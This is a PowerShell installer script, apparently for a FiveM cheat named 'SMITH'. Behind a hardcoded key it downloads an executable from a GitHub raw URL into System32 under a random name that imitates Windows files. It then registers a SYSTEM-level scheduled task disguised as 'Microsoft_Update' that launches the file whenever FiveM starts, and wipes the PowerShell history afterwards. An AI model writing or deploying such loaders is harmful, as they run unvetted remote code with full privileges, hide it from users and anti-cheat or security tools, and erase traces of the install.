$ErrorActionPreference = "SilentlyContinue"
$CorrectKey = "12" 


$p = @("font","drv","host","win","svc") | Get-Random
$m = @("vcp","mgr","svc","hosts","core") | Get-Random
$r = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p$m`_$r.exe"
$taskName = "Microsoft_Update_$r"
$destPath = "C:\Windows\System32\$fileName"
$exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhost.exe"


Clear-Host
$key = Read-Host "Enter Key"

if ($key -ne $CorrectKey) {
    Write-Host "Wrong key!" -ForegroundColor Red
    Start-Sleep 2
    exit
}


while ($true) {
    Clear-Host
    Write-Host "1. Install & Persistence"
    Write-Host "2. Check Status"
    Write-Host "0. Exit"

    $choice = Read-Host "Select"

    if ($choice -eq "1") {
        Clear-Host
        Write-Host "Installing System..." -ForegroundColor Cyan

        try {
            
            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
            Unblock-File -Path $destPath

           
            auditpol /set /subcategory:"Process Creation" /success:enable
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
            schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f

            Write-Host "Install complete!" -ForegroundColor Green
            Write-Host "SMITH will run automatically when FiveM starts." -ForegroundColor Yellow
            
           
            Clear-History
            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "Install failed!" -ForegroundColor Red
            Write-Host $_.Exception.Message -ForegroundColor Yellow
        }
        pause
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Write-Host "--- SYSTEM INFO ---" -ForegroundColor Cyan
        if (Test-Path $destPath) {
            Write-Host "Status: Ready" -ForegroundColor Green
            Write-Host "File  : $fileName"
            Write-Host "Task  : $taskName"
        } else {
            Write-Host "Status: Not Installed" -ForegroundColor Red
        }
        pause
    }
    elseif ($choice -eq "0") {
        exit
    }
}
